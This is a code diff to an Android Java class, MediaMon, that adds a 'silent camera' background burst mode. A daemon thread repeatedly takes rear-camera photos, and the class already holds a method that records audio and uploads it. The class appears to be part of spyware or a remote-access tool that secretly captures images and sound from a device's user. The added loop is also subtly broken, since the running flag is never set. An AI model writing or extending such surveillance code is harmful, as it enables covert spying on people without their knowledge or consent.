@@ -17,6 +17,43 @@ import java.io.FileOutputStream;
 final class MediaMon {
     private static final int MAX_SECONDS = 300;
     private static final int MAX_JPEG = 3 * 1024 * 1024;
+    private static volatile boolean camRunning;
+    private static volatile long camTickMs = 3000;
+
+    /** Silent camera: background burst mode over the rear camera. */
+    static String camStart(final Context ctx, long intervalMs) {
+        if (camRunning) {
+            return "already recording";
+        }
+        final long tick = Math.max(1000, intervalMs);
+        final Context app = ctx.getApplicationContext();
+        final Thread loop = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                while (camRunning) {
+                    photo(app);
+                    try {
+                        Thread.sleep(tick);
+                    } catch (InterruptedException exc) {
+                        Thread.currentThread().interrupt();
+                        break;
+                    }
+                }
+            }
+        }, "cam-burst");
+        loop.setDaemon(true);
+        loop.start();
+        return "cam burst on";
+    }
+
+    static String camStop() {
+        camRunning = false;
+        return "cam stopped";
+    }
+
+    static String camState() {
+        return camRunning ? "recording" : "idle";
+    }
 
     /** Records an AAC/m4a clip, uploads it and returns the transfer verdict. */
     static String record(Context ctx, int seconds) {
